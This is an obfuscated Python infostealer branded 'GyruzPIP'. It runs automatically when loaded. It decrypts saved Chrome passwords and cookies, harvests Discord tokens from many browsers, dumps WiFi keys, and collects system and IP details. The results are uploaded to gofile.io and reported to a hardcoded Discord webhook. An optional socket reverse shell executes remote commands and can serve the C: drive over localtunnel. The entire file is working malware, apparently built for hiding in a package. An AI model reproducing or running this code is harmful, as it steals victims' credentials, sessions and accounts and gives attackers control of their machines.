A7='content-type'
A6='GyruzPIP'
A5='username'
A4='embeds'
A3='content'
A2='text'
A1='footer'
A0='author'
z='fields'
y='color'
x='ignore'
w='User Data'
v='Chrome'
u='Google'
t='Local'
s='AppData'
r='USERPROFILE'
q='encrypted_key'
p='os_crypt'
o='r'
n='\n'
m='https://icanhazip.com'
l=len
k=range
a='application/json'
Z='LOCALAPPDATA'
Y=False
S=True
P='utf-8'
O='w'
L='value'
K=Exception
I=str
H='name'
G=open
D=''
C=None
import re as F,os as A,time,shutil as T,sqlite3 as U,base64 as V,json as M,sys,string as b,socket as N,tempfile as A8,platform as J,subprocess as E
from random import choice as c
from requests import get as Q,post as R
from datetime import datetime as d,timedelta as e
from uuid import getnode as f
from win32crypt import CryptUnprotectData as W
from cryptography.hazmat.backends import default_backend as g
from cryptography.hazmat.primitives.ciphers import Cipher as h,algorithms as i,modes
class B:webhook='https://discord.com/api/webhooks/1039219061692825656/ic1u9e-JdBh-fu-0V4utepYaCB3BOiSehzYz9Y7ujG1ZZLIv5X0nHBiSJoMpzf7PWAFG';printOnEnd=Y;endText='PROGRAM FINISHED';REVSHELL=Y;serverip='YOUR-IP';buffer=1024;port=80
class j:
	class LOGGER:
		def __init__(A):A.errors=D;A.INFO={'System':J.system(),'Release':J.release(),'Version':J.version(),'Arch':J.machine(),'Host':N.gethostname(),'Local IP':N.gethostbyname(N.gethostname()),'IP Addr':Q(m).text.split(n)[0],'MAC Addr':':'.join(F.findall('..','%012x'%f()))}
		def RndFileName(B):A=D.join((c(b.ascii_letters)for A in k(6)));return f"C:\\ProgramData\\{A}.txt"
		def UploadFile(F,filepath,filename='File'):
			B='https://store4.gofile.io/uploadFile'
			try:C={'file':G(filepath,'rb')};D=R(B,files=C).json();A=f"[{filename}]({D['data']['downloadPage']})"
			except K as E:LOGGER.errors+=f"{E}\n";A='Upload Error'
			return A
		def ErrorLog(A):
			B=LOGGER.RndFileName()
			with G(B,O)as C:C.write(I(A.errors));C.close();return A.UploadFile(B,filename='System Error Log')if A.errors!=D else'No System Error Log'
		class GetWifiPasswords:
			def __init__(A):A.command='netsh wlan show profile';A.passwords=D
			def Passwords(A):
				R='strict';C=E.check_output(A.command,shell=S,stderr=E.DEVNULL,stdin=E.DEVNULL);C=C.decode(encoding=P,errors=R);D=F.findall('(?:Profile\\s*:\\s)(.*)',C)
				for G in D:
					try:H='netsh wlan show profile '+G+' key=clear';B=E.check_output(H,shell=S,stderr=E.DEVNULL,stdin=E.DEVNULL);B=B.decode(encoding=P,errors=R);J=F.findall('(?:SSID name\\s*:\\s)(.*)',I(B));L=F.findall('(?:Authentication\\s*:\\s)(.*)',B);M=F.findall('(?:Cipher\\s*:\\s)(.*)',B);N=F.findall('(?:Security key\\s*:\\s)(.*)',B);O=F.findall('(?:Key Content\\s*:\\s)(.*)',B);A.passwords+=f"\n\nSSID           : {J[0]}";A.passwords+=f"Authentication : {L[0]}";A.passwords+=f"Cipher         : {M[0]}";A.passwords+=f"Security Key   : {N[0]}";A.passwords+=f"Password       : {O[0]}"
					except K as Q:LOGGER.errors+=f"{Q}\n"
				return A.passwords
			def Main(C):
				A=LOGGER.RndFileName()
				with G(A,O)as B:B.write(I(C.Passwords()));B.close()
				return LOGGER.UploadFile(A,filename='WiFi Passwords')
		class GetChromePasswords:
			def __init__(B):B.passwordlog=D;B.APP_DATA_PATH=A.environ[Z];B.DB_PATH='Google\\Chrome\\User Data\\Default\\Login Data';B.NONCE_BYTE_SIZE=12
			def AddPassword(C,db_file):
				D=db_file;E=U.connect(D);G='select signon_realm,username_value,password_value from logins'
				for B in E.execute(G):
					F=B[0]
					if F.startswith('android'):continue
					H=B[1];I=C.ChromeDecrypt(B[2]);J='Hostname: %s\nUsername: %s\nPassword: %s\n\n'%(F,H,I);C.passwordlog+=J
				E.close();A.remove(D)
			def ChromeDecrypt(C,encrypted_txt):
				A=encrypted_txt
				if A[:4]==b'\x01\x00\x00\x00':B=C.DecryptDPAPI(A);return B.decode()
				elif A[:3]==b'v10':B=C.DecryptAES(A);return B[:-16].decode()
			def Decrypt(C,cipher,ciphertext,nonce):A=cipher;A.mode=modes.GCM(nonce);B=A.decryptor();return B.update(ciphertext)
			def GetCipher(B,key):A=h(i.AES(key),C,backend=g());return A
			def DecryptDPAPI(I,encrypted):
				B=encrypted;import ctypes,ctypes.wintypes
				class D(ctypes.Structure):_fields_=[('cbData',ctypes.wintypes.DWORD),('pbData',ctypes.POINTER(ctypes.c_char))]
				E=ctypes.create_string_buffer(B,l(B));F=D(ctypes.sizeof(E),E);A=D();G=ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(F),C,C,C,C,0,ctypes.byref(A))
				if not G:raise ctypes.WinError()
				H=ctypes.string_at(A.pbData,A.cbData);ctypes.windll.kernel32.LocalFree(A.pbData);return H
			def LocalKey(E):
				B=C
				with G(A.path.join(A.environ[Z],'Google\\Chrome\\User Data\\Local State'),encoding=P,mode=o)as D:B=M.loads(I(D.readline()))
				return B[p][q]
			def DecryptAES(A,encrypted_txt):C=encrypted_txt;D=A.LocalKey();B=V.b64decode(D.encode());B=B[5:];E=A.DecryptDPAPI(B);F=C[3:15];G=A.GetCipher(E);return A.Decrypt(G,C[15:],F)
			def Main(B):
				F=A.path.join(B.APP_DATA_PATH,B.DB_PATH);C=A.path.join(B.APP_DATA_PATH,'sqlite_file');T.copyfile(F,C);B.AddPassword(C);D=LOGGER.RndFileName()
				with G(D,O)as E:E.write(I(B.passwordlog));E.close();return LOGGER.UploadFile(D,filename='Chrome Passwords')
		class GetChromeCookies:
			def __init__(B):
				D=A.path.join(A.environ[r],s,t,u,v,w,'Local State')
				with G(D,o,encoding=P)as E:F=M.loads(E.read())
				H=V.b64decode(F[p][q])[5:];B.key=W(H,C,C,C,0)[1]
			def TimeReadable(C,chromedate):
				A=chromedate
				if A!=86400000000 and A:
					try:return d(1601,1,1)+e(microseconds=A)
					except K as B:LOGGER.errors+=f"{B}\n"
				else:return D
			def DecryptData(F,data,key):
				A=data
				try:from Crypto.Cipher import AES;B=A[3:15];A=A[15:];E=AES.new(key,AES.MODE_GCM,B);return E.Decrypt(A)[:-16].decode()
				except:
					try:return I(W(A,C,C,C,0)[1])
					except:return D
			def Main(B):
				Q=A.path.join(A.environ[r],s,t,u,v,w,'Default','Network','Cookies');D='Cookies.db'
				if not A.path.isfile(D):T.copyfile(Q,D)
				C=U.connect(D);C.text_factory=lambda b:b.decode(errors=x);E=C.cursor();E.execute('\n                SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value \n                FROM cookies');R=B.key
				try:
					F=LOGGER.RndFileName()
					with G(F,O,encoding=P)as H:
						for (I,J,L,S,V,W,M) in E.fetchall():N=B.DecryptData(M,R)if not L else L;H.write(f"""
                                URL: {I}
                                Cookie name: {J}
                                Cookie value (encrypted): {M}
                                Cookie value (decrypted): {N}
                                Creation date: {B.TimeReadable(S)}
                                Last accessed: {B.TimeReadable(V)}
                                Expires at: {B.TimeReadable(W)}
                            """);E.execute('\n                            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\n                            WHERE host_key = ?\n                            AND name = ?',(N,I,J))
						H.close()
					C.commit();C.close();return LOGGER.UploadFile(F,filename='Chrome Cookies')
				except K as X:LOGGER.errors+=f"{X}\n";return'No Chrome Cookie File'
		class DiscordTokens:
			def __init__(A):A.tokens=[];A.rawtokens=D;A.tokeninfo=D
			def GetTokens(D):
				B=A.getenv(Z);C=A.getenv('APPDATA');K={'Discord':C+'\\Discord','Discord Canary':C+'\\discordcanary','Discord PTB':C+'\\discordptb','Google Chrome':B+'\\Google\\Chrome\\User Data\\Default','Opera':C+'\\Opera Software\\Opera Stable','Brave':B+'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':B+'\\Yandex\\YandexBrowser\\User Data\\Default','Lightcord':C+'\\Lightcord','Opera GX':C+'\\Opera Software\\Opera GX Stable','Amigo':B+'\\Amigo\\User Data','Torch':B+'\\Torch\\User Data','Kometa':B+'\\Kometa\\User Data','Orbitum':B+'\\Orbitum\\User Data','CentBrowser':B+'\\CentBrowser\\User Data','7Star':B+'\\7Star\\7Star\\User Data','Sputnik':B+'\\Sputnik\\Sputnik\\User Data','Vivaldi':B+'\\Vivaldi\\User Data\\Default','Chrome SxS':B+'\\Google\\Chrome SxS\\User Data','Epic Privacy Browser':B+'\\Epic Privacy Browser\\User Data','Microsoft Edge':B+'\\Microsoft\\Edge\\User Data\\Default','Uran':B+'\\uCozMedia\\Uran\\User Data\\Default','Iridium':B+'\\Iridium\\User Data\\Default\\Local Storage\\leveld','Firefox':C+'\\Mozilla\\Firefox\\Profiles'}
				for (J,E) in K.items():
					E+='\\Local Storage\\leveldb'
					if A.path.exists(E):
						for H in A.listdir(E):
							if H.endswith('.log')or H.endswith('.ldb')or H.endswith('.sqlite'):
								for L in [A.strip()for A in G(f"{E}\\{H}",errors=x).readlines()if A.strip()]:
									for M in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}','mfa\\.[\\w-]{84}'):
										for I in F.findall(M,L):
											if I+' - '+J not in D.tokens:D.tokens.append(I+' -> '+J);D.rawtokens+=f"\n{I}\n"
				return D.tokens
			def Main(A):
				A.GetTokens();B=LOGGER.RndFileName()
				with G(B,O)as C:
					for D in k(l(A.tokens)):A.tokeninfo+=f"[{D+1}] {A.tokens[D]}\n"
					C.write(I(A.tokeninfo));C.close()
				return LOGGER.UploadFile(B,filename='Token File'),A.rawtokens
			def Valid(C,token):A={'Authorization':token,'Content-Type':a};B=Q('https://discordapp.com/api/v9/users/@me',headers=A);return S if B.status_code==200 else Y
		def Main(A):
			I=A.GetChromePasswords();K=A.GetChromeCookies();N=A.DiscordTokens();O=I.Main();P=K.Main();C=N.Main();E=D
			for F in A.INFO:E+=f"{F} : {A.INFO[F]}\n"
			Q={y:0,z:[{H:'**Tokens**',L:f"```{C[1]}```"},{H:'System Information',L:f"```{E}```"},{H:'Python Version',L:f"```{J.python_version()}```"},{H:'System Files',L:f"**{C[0]}**\n**{O}**\n**{P}**\n**{A.ErrorLog()}**"}],A0:{H:f"GyruzPIP ✔️"},A1:{A2:f"github.com/0xPacker"}};S={A3:f"**GyruzPIP Executed** ||@everyone||",A4:[Q],A5:A6};T=R(B.webhook,headers={A7:a},data=M.dumps(S).encode());G=X.NETWORK();G.Main()if B.REVSHELL else G.Persistence()
	class NETWORK:
		def __init__(B):B.ip=Q(m).text.split(n)[0];B.cwd=A.getcwd()
		def Persistence(A):return C
		def onLoad(A):C={y:0,z:[{H:'**Reverse Shell Connected**',L:f"```{A.ip} -> {B.serverip}:{B.port}```"},{H:'**Configuration**',L:f"```PORT -> {B.port}\nIP   -> {A.ip}                                    \nBUFFER -> {B.buffer}\nSERVER -> {B.serverip}```"}],A0:{H:f"GyruzPIP ✔️"},A1:{A2:f"github.com/codeuk/GyruzPIP"}};E={A3:D,A4:[C],A5:A6};F=R(B.webhook,headers={A7:a},data=M.dumps(E).encode())
		def Main(F):
			A=N.socket();A.connect((B.serverip,B.port));A.send(F.cwd.encode());F.onLoad()
			while S:
				try:
					C=A.recv(B.buffer).decode();G=C.split()
					if G[0]=='localtunnel':
						try:H=G[1];M=E.getoutput('npm install -g localtunnel');J=E.getoutput(f"lt --port {H}");O=E.getoutput(f"python -m http.server --directory C:// {H}");D=f"[*] Started localtunnel @ {J}"
						except K as I:D="[!] Couldn't start localtunnel: ",I
					elif C.lower()=='exit':break
					else:D=E.getoutput(C)
					L=f"{D}\n";A.send(L.encode())
				except K as I:A.send('[!] Error on client side!'.encode())
			A.close()
X=j()
LOGGER=X.LOGGER()
LOGGER.Main()
print(B.endText if B.printOnEnd else D)